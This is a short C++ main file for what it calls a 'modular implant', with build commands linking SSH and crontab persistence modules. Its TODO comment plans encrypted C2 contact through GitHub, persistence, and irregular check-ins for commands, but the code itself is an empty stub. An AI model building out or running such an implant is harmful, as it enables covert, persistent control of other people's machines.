// g++ -s core.cpp main.cpp -o test -lssl -lcrypto -lpthread -lstdc++ --static

// g++ -s core.cpp main.cpp clean-encoding.cpp run_command.cpp -o test -lssl -lcrypto -lpthread -I/home/host/LuaDropper/implant/json/include -I/home/host/LuaDropper/implant/base64/include

// g++ -s core.cpp main.cpp clean-encoding.cpp run_command.cpp ssh_persistence.cpp crontab_persistence.cpp -o test -lssl -lcrypto -lpthread -I./json/include -I./base64/include

// ldd application.elf

#include <iostream>
#include <stdexcept>
#include "core.h"

// This is the application core of the modular implant

int main() {
    Core run;
    /*
     * TODO:
     *
     * 1. establish encrypted contact with the C2 GitHub over https                     (Core::contact_server)
     * 2. establish SSH (if possible) and cron based persistence                        (Core::)
     * 3. start looping, irregularly checking back with the C2 for instruction          (Core::loop)
     *
     * */
}

